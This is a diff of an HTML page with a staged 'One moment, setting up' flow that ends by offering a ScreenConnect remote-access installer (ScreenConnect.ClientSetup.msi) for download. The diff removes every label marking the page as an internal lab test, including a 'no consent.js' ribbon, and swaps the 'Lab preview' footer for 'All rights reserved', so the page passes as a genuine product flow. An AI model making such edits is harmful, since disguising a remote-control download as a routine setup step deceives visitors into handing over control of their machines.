@@ -13,19 +13,6 @@
       color: #111;
       overflow: hidden;
     }
-    .lab-ribbon {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      z-index: 100;
-      background: #1a3a52;
-      color: #e8f4fc;
-      text-align: center;
-      font-size: 12px;
-      letter-spacing: 0.02em;
-      padding: 6px 12px;
-    }
     .stage {
       position: absolute;
       inset: 0;
@@ -191,13 +178,6 @@
       font-size: 11px;
       color: #888;
     }
-    .s3-lab {
-      margin-top: 8px;
-      text-align: center;
-      font-size: 11px;
-      color: rgba(255, 255, 255, 0.45);
-    }
-
     @keyframes spin { to { transform: rotate(360deg); } }
     @keyframes s1-rise {
       from { opacity: 0; transform: translateY(16px); }
@@ -218,13 +198,11 @@
   </style>
 </head>
 <body>
-  <div class="lab-ribbon" role="note">Internal lab — 3-step flow test (no consent.js) · step 3 is manual download</div>
-
   <section class="stage stage--1 is-active" id="stage-1" aria-live="polite">
     <h1 class="s1-title">One moment</h1>
     <p class="s1-sub">Setting up everything for you. Only a moment more.</p>
     <div class="s1-spinner" aria-hidden="true"></div>
-    <p class="s1-footer">© 2026 — Lab preview</p>
+    <p class="s1-footer">© 2026 — All rights reserved</p>
   </section>
 
   <section class="stage stage--2" id="stage-2" aria-live="polite">
@@ -251,7 +229,6 @@
       </div>
       <p class="s3-meta">ScreenConnect.ClientSetup.msi · same origin</p>
     </div>
-    <p class="s3-lab">Lab flow · manual download only</p>
   </section>
 
   <script>
